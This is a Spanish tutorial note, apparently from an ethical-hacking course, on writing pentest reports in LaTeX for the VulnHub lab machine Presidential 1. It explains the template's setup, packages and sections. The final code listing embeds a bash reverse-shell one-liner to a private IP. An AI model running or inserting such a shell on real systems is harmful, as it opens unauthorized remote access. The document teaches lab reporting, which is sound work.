---
aliases:
  - Informes LaTeX
  - LaTeX Reports
tags:
  - hacking/documentacion
estado: 🟢 Terminado
---
# Creación de Informes en LaTeX

Vamos a ver cómo se deben crear los informes en LaTeX.

Usualmente tenemos dos tipos de documentos: los `Informes Técnicos` y los `Informes Ejecutivos`.

## Configuración del Entorno

Primero, vamos a instalar las utilidades necesarias para generar estos informes:

```bash
sudo apt install latexmk zathura texlive-full texlive-base
```

> [!info] Componentes de LaTeX
> *   **`latexmk`**: Es una herramienta que automatiza el proceso de compilación de documentos LaTeX, ejecutando `pdflatex`, `bibtex`, `makeindex` y otros programas las veces necesarias para generar un PDF final con todas las referencias y el índice correctamente resueltos.
> *   **`zathura`**: Un visor de documentos ligero y altamente configurable que soporta PDF, PostScript y DjVu. Es ideal para flujos de trabajo con `latexmk` debido a su capacidad de recargar documentos automáticamente.
> *   **`texlive-full`**: Proporciona una distribución completa de TeX Live, incluyendo una vasta colección de paquetes, fuentes y herramientas para LaTeX. Es una instalación grande pero asegura que se tengan todos los recursos necesarios.
> *   **`texlive-base`**: Contiene los paquetes y programas esenciales de TeX Live, siendo una opción más ligera si no se necesita la suite completa.

Ahora, vamos a ejecutar los siguientes comandos para configurar Zathura como visor de PDF predeterminado:

```bash
sudo xdg-mime query default application/pdf
```

```bash
sudo xdg-mime default zathura.desktop application/pdf
```

Con esto, cualquier documento que abramos con `latexmk` se abrirá con Zathura.

Por último, tanto en el directorio del usuario como en el de `root`, crearemos dentro de `.config` la carpeta `latexmk` y, dentro de ella, el archivo `latexmkrc` con el siguiente contenido:

```
$pdf_previewer = "zathura";
```

> [!tip] Archivo de Configuración `latexmkrc`
> El archivo `latexmkrc` es un script de configuración personalizable para `latexmk`. Permite definir variables y funciones para adaptar el comportamiento de la compilación. En este caso, `$pdf_previewer` se utiliza para especificar el visor de PDF que `latexmk` debe usar para la previsualización continua (`-pvc`).

Listo, ya tenemos el entorno configurado.

En este punto, vamos a practicar con la documentación de la máquina [[Presidential 1]], ya que vamos a detallar un informe para la misma.

## Notas de la Práctica

Bueno, comenzamos definiendo el formato de plantilla que vamos a utilizar:

```latex
\documentclass[a4paper]{article} % Formato de plantilla que vamos a utilizar

\usepackage[utf8]{inputenc} % Para poder utilizar caracteres especiales
\usepackage[spanish]{babel} % Para poder utilizar caracteres especiales

```

> [!info] Comandos Básicos de LaTeX
> *   **`\documentclass[a4paper]{article}`**: Define el tipo de documento (`article`) y el tamaño del papel (`a4paper`). Otros tipos comunes incluyen `report`, `book`, `letter`, `beamer` (para presentaciones).
> *   **`\usepackage[utf8]{inputenc}`**: Permite el uso de caracteres especiales y acentos al especificar la codificación de entrada del archivo fuente como UTF-8.
> *   **`\usepackage[spanish]{babel}`**: Adapta el documento a las convenciones del idioma español, incluyendo la separación de sílabas, nombres de secciones (ej. "Índice" en lugar de "Contents") y reglas tipográficas específicas.

Ahora, la estructura general para un documento sería la siguiente:

```latex
\documentclass[a4paper]{article} % Formato de plantilla que vamos a utilizar

\usepackage[utf8]{inputenc} % Para poder utilizar caracteres especiales
\usepackage[spanish]{babel} % Para poder utilizar caracteres especiales

\begin{document} % Inicio del documento

Hola que tal probando

\end{document} % Fin del documento

```

Con esto ya definido, vamos a generar un archivo PDF resultante con el siguiente comando:

```bash
latexmk -pdf Documento.tex
```

![[Pasted image 20250831185312.png]]

Como podemos ver, se genera el documento en PDF, el cual podemos abrir con el lector de PDF que deseemos.

Esto no es muy práctico, ya que tendríamos que terminar de redactar todo el proyecto para luego generar el PDF. Por ello, modificaremos el comando de la siguiente manera:

```bash
 latexmk -pdf Documento.tex -pvc
```

> [!tip] Previsualización Continua con `latexmk -pvc`
> La opción `-pvc` (preview continuous) de `latexmk` es extremadamente útil para el desarrollo de documentos LaTeX. Mantiene el proceso de compilación en segundo plano, monitoreando los cambios en el archivo `.tex` y sus dependencias. Cada vez que se guarda el archivo, `latexmk` recompila automáticamente el documento y actualiza el visor de PDF (si está configurado, como Zathura), permitiendo una previsualización en tiempo real de los cambios.

![[Pasted image 20250831191254.png]]

Esto nos permite ver los cambios en tiempo real cada vez que guardemos el documento.

Con esto claro, comenzaremos ahora sí con la estructura completa del documento. En este caso, dejaremos el código comentado para ilustrar su funcionamiento:

```latex
\documentclass[a4paper]{article}

\usepackage[utf8]{inputenc} % Para poder utilizar caracteres especiales
\usepackage[spanish]{babel} % Para poder utilizar caracteres especiales
\usepackage[margin=2cm, top=2cm, includefoot]{geometry} % Para establecer los márgenes del documento
\usepackage{graphicx} % Para la inserción de imágenes
\usepackage[table,xcdraw]{xcolor} % Para la representación de colores
\usepackage{tikz,lipsum,lmodern} % Para la creación de cajas y otros elementos gráficos
\usepackage[most]{tcolorbox} % Para la creación de cajas con estilo avanzado
\usepackage{fancyhdr} % Para definir el estilo de la página (encabezados y pies de página)
\usepackage[hidelinks]{hyperref} % Para las referencias del índice y enlaces interactivos (oculta los bordes de los enlaces)
\usepackage{setspace} % Para el espaciado entre líneas
\setstretch{1.2} % Controla el espaciado entre líneas (1.2 significa 120% del espaciado normal)
\usepackage{parskip} % Para arreglar el espacio blanco entre párrafos
\setlength{\parindent}{0pt}
\setlength{\parskip}{0.8em plus 0.5em minus 0.2em} % Establece el espacio entre párrafos de fuente de un em, más 0.5 de espaciado extra permitido con una reducción máxima de 0.2em
\setlength{\parfillskip}{\parindent plus 1fill}
\usepackage[figurename=Image]{caption} % Importación para cambiar el nombre de la imagen (ej. de "Figura" a "Image")
\usepackage{ragged2e} % Para ajustar la justificación al terminar un centrado
\usepackage{listings} % Para la inserción de código fuente con formato

\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{backcolour}{rgb}{0.95,0.95,0.92}

\lstdefinestyle{mystyle}{
    backgroundcolor=\color{backcolour},   
    commentstyle=\color{codegreen},
    keywordstyle=\color{magenta},
    numberstyle=\tiny\color{codegray},
    stringstyle=\color{codepurple},
    basicstyle=\ttfamily\footnotesize,
    breakatwhitespace=false,         
    breaklines=true,                 
    captionpos=b,                    
    keepspaces=true,                 
    numbers=left,                    
    numbersep=5pt,                  
    showspaces=false,                
    showstringspaces=false,
    showtabs=false,                  
    tabsize=2
}

\lstset{style=mystyle}

% declaración de variables personalizadas
\newcommand{\logoPortada}{./img/logoVulnHub.png}
\newcommand{\machineName}{Presidential: 1}
\newcommand{\logoMachine}{./img/Casa-Blanca.jpg}
\newcommand{\startDate}{31 de Agosto del 2025}
\newcommand{\logoAcademia}{./img/logoAcademia.png}
\newcommand{\logoVulnhubSimple}{./img/LogoVulhubMini.png}


%Adicionales
\addto\captionsspanish{\renewcommand{\contentsname}{Índice}}
\setlength{\headheight}{40.2pt}
\pagestyle{fancy}
\fancyhf{}
\lhead{\includegraphics[width=1.3cm]{\logoAcademia}}\rhead{\includegraphics[height=1.5cm]{\logoVulnhubSimple}}
\renewcommand{\headrulewidth}{3pt} % Aumentar el tamaño de la barra
\renewcommand{\headrule}{\hbox to\headwidth{\color{bluePortada}\leaders\hrule height \headrulewidth\hfill}}
\renewcommand{\lstlistingname}{Código} % Cambiamos Lising por Código


% definicion de colores
\definecolor{bluePortada}{HTML}{146c8a}

\begin{document}
\cfoot{\thepage}
\begin{titlepage}
	\centering{
		\includegraphics[width=0.5\textwidth]{\logoPortada}\par\vspace{1cm}
		% Tenemos dos opciones: textwidth y paperwidth, donde:
		% textwidth se acopla al tamaño del texto.
		% En el caso de paperwidth, jugamos con makebox para que se acople bien al tamaño del papel. Ejemplo:
		% \makebox[\textwidth]{\includegraphics[width=\paperwidth]{./img/logoVulnHub.png}}
		% El par\vspace{1cm} nos permite dar medidas específicas

		{\scshape\LARGE \textbf{Informe Técnico}}\par\vspace{0.4cm}
		% \scshape\LARGE nos permite poner el texto más grande
		% \textbf{} nos permite hacer la fuente en negrita

		{\Huge\textcolor{bluePortada}{\textbf{Máquina \machineName}}} % Definiendo color al texto
		\vfill\vfill
		\includegraphics[width=\textwidth, height=10cm, keepaspectratio]{\logoMachine}
		\vfill
	}

	\begin{tcolorbox}[colback=red!5!white,colframe=red!75!black]
		\centering{
			Este documento es confidencial y contiene información sensible. \\ % Los \\ son para salto de línea
			No debería ser impreso ni compartido con terceras entidades
		}
	\end{tcolorbox}
	\vfill
	{\large \startDate}
	\vfill
\end{titlepage}

> [!info] Paquetes y Comandos Avanzados de LaTeX
> *   **`geometry`**: Permite personalizar fácilmente los márgenes y el diseño de la página. `margin=2cm` establece un margen de 2cm en todos los lados, `top=2cm` ajusta el margen superior, e `includefoot` asegura que el pie de página esté dentro del área de texto definida.
> *   **`graphicx`**: Esencial para incluir imágenes en el documento. El comando `\includegraphics` se utiliza para insertar archivos de imagen.
> *   **`xcolor`**: Proporciona capacidades avanzadas para el uso de colores, incluyendo la definición de colores por nombre, modelos RGB, CMYK, HTML, y la capacidad de colorear tablas y texto.
> *   **`tikz`**: Un potente paquete para crear gráficos vectoriales programáticamente dentro de LaTeX. Permite dibujar diagramas, gráficos y figuras complejas.
> *   **`tcolorbox`**: Un paquete versátil para crear cajas de texto con fondos, marcos, títulos y estilos personalizables, ideal para resaltar información importante o bloques de código.
> *   **`fancyhdr`**: Ofrece un control detallado sobre los encabezados y pies de página, permitiendo definir contenido diferente para páginas pares/impares, primera página, etc.
> *   **`hyperref`**: Crea enlaces interactivos dentro del PDF (índice, referencias cruzadas) y enlaces externos. La opción `hidelinks` oculta los bordes de los enlaces para una apariencia más limpia.
> *   **`setspace`**: Permite ajustar el espaciado entre líneas del documento. `\setstretch{1.2}` establece un interlineado del 120%.
> *   **`parskip`**: Modifica el comportamiento del espaciado entre párrafos. `\setlength{\parindent}{0pt}` elimina la sangría de la primera línea, y `\setlength{\parskip}{...}` define el espacio vertical entre párrafos.
> *   **`caption`**: Permite personalizar el formato de los títulos de figuras y tablas, como cambiar el prefijo de "Figura" a "Image".
> *   **`ragged2e`**: Proporciona comandos de justificación más flexibles que los predeterminados de LaTeX, como `\justifying` para texto justificado.
> *   **`listings`**: Un paquete robusto para incluir listados de código fuente en el documento, con resaltado de sintaxis, numeración de líneas y opciones de estilo personalizables.
> *   **`\definecolor{nombre}{modelo}{valor}`**: Define un nuevo color. `HTML` permite usar códigos hexadecimales (ej. `146c8a`). `rgb` usa valores de 0 a 1 para rojo, verde y azul.
> *   **`\newcommand{\nombre}{contenido}`**: Permite definir nuevos comandos o macros. Es útil para almacenar rutas de imágenes, nombres de máquinas o fechas, facilitando la actualización global de estos valores.
> *   **`\addto\captionsspanish{\renewcommand{\contentsname}{Índice}}`**: Modifica el nombre del índice de "Contents" a "Índice" cuando se usa el paquete `babel` con la opción `spanish`.
> *   **`\pagestyle{fancy}`**: Activa el estilo de página definido por `fancyhdr`.
> *   **`\lhead{...}` / `\rhead{...}` / `\cfoot{...}`**: Comandos de `fancyhdr` para definir el contenido del encabezado izquierdo, encabezado derecho y pie de página central, respectivamente.
> *   **`\renewcommand{\headrulewidth}{3pt}`**: Aumenta el grosor de la línea del encabezado.
> *   **`\begin{titlepage}` / `\end{titlepage}`**: Entorno para crear una página de título personalizada, que no se numera y tiene un formato especial.
> *   **`\centering`**: Centra el contenido dentro de su entorno.
> *   **`\includegraphics[width=0.5\textwidth]{...}`**: Inserta una imagen. `width=\textwidth` ajusta la imagen al ancho del texto. `\paperwidth` se refiere al ancho total del papel. `keepaspectratio` mantiene la proporción de la imagen.
> *   **`\scshape`**: Cambia el texto a versalitas (small caps).
> *   **`\LARGE` / `\Huge`**: Comandos para cambiar el tamaño de la fuente.
> *   **`\textbf{...}`**: Pone el texto en negrita.
> *   **`\textcolor{color}{texto}`**: Aplica un color específico al texto.
> *   **`\vfill`**: Inserta espacio vertical elástico, distribuyendo el espacio restante de manera uniforme.
> *   **`\\`**: Fuerza un salto de línea dentro de un párrafo o entorno.

---

# Estructura del Informe

## Índice

```latex
% ---------------------------------------
% Comienzo del Índice
\clearpage
\tableofcontents
\clearpage
%-----------
```

> [!info] Generación del Índice
> *   **`\clearpage`**: Fuerza un salto de página, asegurando que el contenido siguiente comience en una nueva página.
> *   **`\tableofcontents`**: Genera automáticamente el índice del documento, listando todas las secciones, subsecciones y subsubsecciones con sus respectivos números de página. Para que funcione correctamente, el documento debe ser compilado varias veces (generalmente con `latexmk`).

## Antecedentes

```latex
\section{Antecedentes}

El presente documento recoge los resultados obtenidos durante la fase de auditoría realizada a la Máquina
\textbf{\machineName}, enumerando todos los vectores de ataque encontrados así como la explotación realizada
para cada uno de estos.

Esta máquina ha sido descargada de la plataforma de
\href{https://vulnhub.com}{\textbf{\color{bluePortada}Vulnhub}}, una plataforma
de entrenamiento y práctica para personas interesadas en el hacking ético.

A continuación, se proporciona el enlace directo de descarga a esta máquina:

\vspace{0.2cm}

\begin{tcolorbox}[enhanced,attach boxed title to top center={yshift=-3mm,yshifttext=-1mm},
		colback=blue!5!white,colframe=blue!75!black,colbacktitle=bluePortada!80!black,
		title=Dirección URL,fonttitle=\bfseries,
		boxed title style={size=small,colframe=bluePortada!50!black} ]
	\centering{
		\href{https://www.vulnhub.com/entry/presidential-1,500/}{\textbf{\color{bluePortada}https://www.vulnhub.com/entry/presidential-1,500/}}
	}
\end{tcolorbox}

\vspace{0.5cm}

\begin{figure}[h] % Forma correcta para insertar imágenes
	\centering{
		\setlength{\fboxrule}{0.8pt}
		\fbox{\includegraphics[width=\textwidth]{./img/presidential-img.png}}
		\caption{Página principal del servicio web de la máquina}
	}
\end{figure}
```

> [!info] Comandos de Sección y Enlaces
> *   **`\section{Título}`**: Define una nueva sección principal en el documento. LaTeX numera automáticamente las secciones y las incluye en el índice.
> *   **`\href{URL}{Texto}`**: Crea un hipervínculo. `URL` es la dirección a la que apunta el enlace, y `Texto` es el texto visible que actúa como enlace.
> *   **`\vspace{longitud}`**: Inserta un espacio vertical de la `longitud` especificada (ej. `0.2cm`, `0.5em`).
> *   **`\begin{figure}[h]`**: Inicia un entorno de figura flotante. La opción `[h]` sugiere a LaTeX que intente colocar la figura "aquí" (here), aunque LaTeX puede moverla si no hay suficiente espacio. Otras opciones incluyen `[t]` (top), `[b]` (bottom), `[p]` (page of floats).
> *   **`\centering`**: Centra el contenido dentro del entorno actual.
> *   **`\setlength{\fboxrule}{0.8pt}`**: Establece el grosor de la línea del marco de la caja (`\fbox`).
> *   **`\fbox{contenido}`**: Dibuja un marco alrededor del `contenido`.
> *   **`\caption{Texto}`**: Proporciona un título o descripción para la figura o tabla, que se numera automáticamente y se incluye en la lista de figuras/tablas.

## Objetivos

```latex
\section{Objetivos}
Los objetivos de la presente auditoría de seguridad se enfocan en la
identificación de posibles vulnerabilidades y debilidades en la máquina
\textbf{\color{bluePortada}\machineName}, con el propósito de garantizar la
integridad y confidencialidad de la información almacenada en ella.

Con este fin, se ha llevado a cabo un análisis exhaustivo de todos los servicios
detectados que se encontraban expuestos en dicho servidor, recopilando
información detallada sobre aquellos que representan un riesgo potencial desde
el punto de vista de la seguridad.

\clearpage
\subsection{Alcance}

A continuación, se presentan los objetivos a cumplir para esta auditoría:

\begin{itemize}
	\item Identificar los puertos y servicios vulnerables.
	\item Realizar una explotación de las vulnerabilidades encontradas.
	\item Conseguir acceso al servidor mediante la explotación de los
	      servicios vulnerables identificados.
	\item Enumerar vías potenciales de elevar privilegios en el sistema una vez
	      este ha sido vulnerado.

\end{itemize}

\subsection{Impedimentos y limitaciones}
Durante el proceso de auditoría está terminantemente prohibido realizar alguna
de las siguientes actividades:

\begin{itemize}
	\item Realizar tareas que puedan ocasionar una \textbf{denegación de servicio}
	      o afectar a la disponibilidad de los servicios expuestos.
	\item Borrar archivos residentes en el servidor una vez este haya sido
	      vulnerado.
\end{itemize}

\subsection{Resumen general}
En el proceso de la auditoría se realizan varias fases las cuales constan de:

\begin{itemize}
	\item Reconocimiento
	\item Explotación
	\item Escalada de privilegios
\end{itemize}

Comenzamos en la fase de Reconocimiento en la cual se realizó múltiples tipos de
escaneo con el objetivo de obtener la mayor cantidad de información posible sobre
la víctima, en este caso mediante herramientas como \textbf{Nmap, Whatweb,
	Wfuzz, Gobuster} logramos obtener la información suficiente para intentar
diferentes tipos de ataques.

En la Fase de Explotación es donde se intentan los diferentes tipos de ataques
como fueron: \textbf{LFI, XXS, SQLI, RCE} donde el objetivo es siempre obtener
acceso a la máquina mediante una conexión estable y un usuario cualquiera.

Por último, en la fase de escalada de privilegios se realizaron diferentes tipos de
escaneos los cuales nos permitieron enumerar: \textbf{Usuarios, Grupos,
	Servicios, Procesos, Puertos internos} mediante los cuales se realiza el intento
de una escalada de privilegios donde el objetivo siempre será obtener acceso al
usuario con el mayor rango posible dentro del sistema.

\clearpage
```

> [!info] Subsecciones y Listas
> *   **`\subsection{Título}`**: Define una subsección dentro de una sección. También se numera automáticamente y se incluye en el índice.
> *   **`\begin{itemize}` / `\end{itemize}`**: Crea una lista no ordenada (con viñetas). Cada elemento de la lista se introduce con `\item`.

## Reconocimiento

### Enumeración de servicios expuestos

```latex
\section{Reconocimiento}
\subsection{Enumeracion de servicios expuestos}

A continuación, se adjunta una evidencia de los puertos y servicios identificados
durante el reconocimiento aplicando con la herramienta \textbf{nmap}:

\begin{figure}[h] % Forma correcta para insertar imágenes
	\centering
	\setlength{\fboxrule}{0.8pt}
	\fbox{\includegraphics[width=\textwidth]{./img/ScanNmapPorts.png}}
	\caption{Enumeración de puertos con Nmap}
\end{figure}
\vspace{0.3cm}
En este caso, se identificaron 2 puertos activos corriendo por el puerto TCP:

\vspace{0.5cm}

\centering
\begin{tikzpicture}[node distance=2cm, every node/.style={rectangle, draw,
				fill=white}]
	\node (center) {TCP}; % Creando los nodos
	\node (port1) [below left of=center, node distance=3cm] {Puerto 80};
	\node (port2) [below right of=center, node distance=3cm] {Puerto 2082};
	\draw (center) -- (port1); % Dibujando las líneas de los nodos
	\draw (center) -- (port2);
\end{tikzpicture}

\vspace{0.5cm}
\justifying % Para quitar el centrado

Asimismo, no se encontraron puertos expuestos a través de otros protocolos, por lo que se priorizará la evaluación de los puertos identificados en el primer escaneo efectuado.

\clearpage
```

> [!info] Diagramas con TikZ
> *   **`\begin{tikzpicture}[opciones]`**: Inicia un entorno para dibujar gráficos con TikZ. `node distance` define la distancia predeterminada entre nodos, y `every node/.style` aplica un estilo a todos los nodos (rectángulo, borde, fondo blanco).
> *   **`\node (nombre) [posicion] {texto};`**: Crea un nodo con un `nombre` (para referenciarlo), una `posicion` relativa a otro nodo (ej. `below left of=center`), y un `texto`.
> *   **`\draw (nodo1) -- (nodo2);`**: Dibuja una línea entre dos nodos.
> *   **`\justifying`**: Comando del paquete `ragged2e` que restablece la justificación completa del texto, útil después de entornos como `\centering` que cambian la alineación.

### Enumeración de servidores web

```latex
\subsection{Enumeración de servidores web}

A continuación, se presentan los resultados obtenidos con la herramienta
\textbf{WhatWeb}, una herramienta de reconocimiento web que se utiliza para
identificar tecnologías web específicas que se emplean en un sitio web, tras
aplicar un reconocimiento sobre el servicio HTTP corriendo por el puerto 80:


\begin{figure}[h] % Forma correcta para insertar imágenes
	\centering
	\setlength{\fboxrule}{0.8pt}
	\fbox{\includegraphics[width=\textwidth]{./img/Whatweb.png}}
	\caption{Enumeración del servicio HTTP por el puerto 80}
\end{figure}

En los resultados obtenidos, es posible identificar las versiones para algunas
de las tecnologías existentes.

\vspace{0.5cm}
% creando una tabla
\begin{center}
	\begin{tabular}{ c | c } % Centered (c) una columna | centered (c) otra columna
		\textbf{Tecnologías} & \textbf{Versión} \\
		\hline
		PHP                  & 5.5.38           \\
		Apache               & 2.4.6
	\end{tabular}
\end{center}
\vspace{0.4cm}

Dentro de la información representada, también es posible identificar dos correos
electrónicos, los cuales podrían ser utilizados para un ataque de
\textbf{Phishing}.

\vspace{0.3cm}

\begin{center}
	\texttt{contact@example.com} \qquad \texttt{contact@votenow.local}
\end{center}

\vspace{0.3cm}

El \textbf{Phishing} es un tipo de ataque informático que se utiliza para
engañar a las personas y obtener información confidencial, como contraseñas,
información bancaria o detalles de tarjetas de crédito. El ataque se lleva a
cabo mediante el envío de correos electrónicos fraudulentos o mensajes de
texto que parecen legítimos y que solicitan al destinatario que proporcione
información personal o confidencial.


% Insertando código

\begin{lstlisting}[language=bash, caption=Script en Bash encargado de establecer la
conexión]
#!/bin/bash
bash -i >& /dev/tcp/192.168.1.45/443 0>&1

\end{lstlisting}


\end{document}
```

> [!info] Tablas y Listados de Código
> *   **`\begin{tabular}{columnas}`**: Crea un entorno de tabla. La especificación de `columnas` define el número y la alineación de las columnas (ej. `c` para centrado, `l` para izquierda, `r` para derecha). `|` dibuja una línea vertical entre columnas.
> *   **`\textbf{Encabezado} & \textbf{Encabezado} \\`**: Define los encabezados de la tabla. `&` separa las columnas y `\\` indica un salto de fila.
> *   **`\hline`**: Dibuja una línea horizontal en la tabla.
> *   **`\texttt{texto}`**: Formatea el `texto` con una fuente monoespaciada, comúnmente utilizada para código o nombres de archivos.
> *   **`\qquad`**: Inserta un espacio horizontal equivalente a dos `em` (aproximadamente el ancho de dos caracteres 'M').
> *   **`\begin{lstlisting}[opciones]`**: Inicia un entorno para insertar código fuente. Las `opciones` permiten configurar el resaltado de sintaxis (`language`), el título (`caption`), el color de fondo (`backgroundcolor`), el estilo de los comentarios (`commentstyle`), etc. El estilo `mystyle` definido previamente aplica una configuración visual consistente.

Y con esto, tenemos un ejemplo de cómo se debe redactar un informe con LaTeX.
